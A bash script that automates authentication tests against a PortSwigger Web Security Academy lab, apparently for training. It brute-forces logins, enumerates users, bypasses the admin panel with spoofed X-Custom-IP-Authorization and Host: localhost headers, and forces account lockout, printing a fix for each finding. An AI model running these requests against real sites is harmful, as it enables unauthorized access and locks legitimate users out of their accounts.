#!/bin/bash

# PortSwigger Authentication Challenges - Automated Bash Script with Functions and Suggestions
# Requires: curl, jq (optional for JSON parsing)
# Usage: Edit the variables below with your session cookies, credentials, and target URLs.

# --------- Configuration (edit these values) ---------
BASE_URL="https://<your-lab>.web-security-academy.net"
LOGIN_PATH="/login"
ACCOUNT_PATH="/my-account"
ADMIN_PATH="/admin"
USERNAME="wiener"
PASSWORD="peter"
TARGET_USER="carlos"
# -----------------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Brute-force (Credential Stuffing)
test_bruteforce() {
    print_sep
    echo "[1] Test de brute-force d'authentification"
    for user in "$USERNAME" "administrator" "admin" "$TARGET_USER"; do
        resp=$(curl -sk -X POST -d "username=$user&password=$PASSWORD" "$BASE_URL$LOGIN_PATH")
        if [[ "$resp" == *"my-account"* || "$resp" == *"Welcome"* ]]; then
            echo ">> [ALERTE] Authentification réussie pour $user avec $PASSWORD !"
            echo ">> PROPOSITION : Implémenter une protection contre le brute-force (CAPTCHA, lockout, délai)."
        else
            echo "Tentative $user:$PASSWORD -> Échec"
        fi
    done
}

# 2. User enumeration (verbose failure messages)
test_user_enum() {
    print_sep
    echo "[2] Test d'énumération d'utilisateurs"
    for user in "$USERNAME" "administrator" "admin" "$TARGET_USER" "unknownuser"; do
        resp=$(curl -sk -X POST -d "username=$user&password=wrongpass" "$BASE_URL$LOGIN_PATH")
        if [[ "$resp" == *"Invalid username"* ]]; then
            echo ">> [ALERTE] Message d'erreur distinct pour utilisateur inexistant ($user) !"
            echo ">> PROPOSITION : Uniformiser les messages d'échec d'authentification."
        elif [[ "$resp" == *"Invalid password"* ]]; then
            echo "Utilisateur $user existe probablement (erreur mot de passe) !"
        else
            echo "Réponse générique pour $user."
        fi
    done
}

# 3. Authentication bypass via information disclosure (custom header, etc.)
test_auth_bypass_header() {
    print_sep
    echo "[3] Test de contournement via header personnalisé (ex: X-Custom-IP-Authorization)"
    resp=$(curl -sk -H "X-Custom-IP-Authorization: 127.0.0.1" "$BASE_URL$ADMIN_PATH")
    if [[ "$resp" == *"admin-panel"* || "$resp" == *"Delete user"* || "$resp" == *"Welcome"* ]]; then
        echo ">> [ALERTE] Accès admin obtenu via header X-Custom-IP-Authorization !"
        echo ">> PROPOSITION : Ne pas se fier à des headers manipulables côté client pour l'authentification."
    else
        echo "Header X-Custom-IP-Authorization inefficace pour ce lab."
    fi
}

# 4. Host header attacks (bypass)
test_host_header_bypass() {
    print_sep
    echo "[4] Test de contournement via Host header"
    resp=$(curl -sk -H "Host: localhost" "$BASE_URL$ADMIN_PATH")
    if [[ "$resp" == *"admin-panel"* || "$resp" == *"Welcome"* ]]; then
        echo ">> [ALERTE] Accès admin obtenu via Host: localhost !"
        echo ">> PROPOSITION : Valider strictement le header Host côté serveur."
    else
        echo "Host header spoofing inefficace pour ce lab."
    fi
}

# 5. Account lockout (Denial of Service)
test_account_lockout() {
    print_sep
    echo "[5] Test de verrouillage de compte (DoS)"
    for i in {1..5}; do
        resp=$(curl -sk -X POST -d "username=$USERNAME&password=wrongpass" "$BASE_URL$LOGIN_PATH")
    done
    resp=$(curl -sk -X POST -d "username=$USERNAME&password=$PASSWORD" "$BASE_URL$LOGIN_PATH")
    if [[ "$resp" == *"locked"* || "$resp" == *"too many attempts"* ]]; then
        echo ">> [INFO] Compte verrouillé après plusieurs tentatives."
        echo ">> PROPOSITION : Limiter les messages d'erreur et prévoir un mécanisme de déverrouillage sécurisé."
    else
        echo "Pas de verrouillage détecté après plusieurs échecs."
    fi
}

# 6. HTTP method confusion (ex: TRACE, OPTIONS)
test_http_method_confusion() {
    print_sep
    echo "[6] Test de méthodes HTTP non standards (TRACE, OPTIONS)"
    for method in TRACE OPTIONS; do
        resp=$(curl -sk -X $method "$BASE_URL$ADMIN_PATH")
        if [[ "$resp" == *"X-Custom-IP-Authorization"* ]]; then
            echo ">> [ALERTE] Méthode $method révèle un header ou une information sensible !"
            echo ">> PROPOSITION : Désactiver les méthodes HTTP inutiles sur le serveur."
        else
            echo "Méthode $method : rien de sensible détecté."
        fi
    done
}

# Main script execution
echo "=== PortSwigger Authentication Automated Checks ==="
test_bruteforce
test_user_enum
test_auth_bypass_header
test_host_header_bypass
test_account_lockout
test_http_method_confusion

print_sep
echo "[SYNTHÈSE]"
echo "Comparez les réponses ci-dessus pour identifier d'éventuelles failles d'authentification."
echo "Pour chaque alerte, appliquez les propositions correctives recommandées."
echo "Documentation PortSwigger : https://portswigger.net/web-security/authentication"
print_sep

# End of script
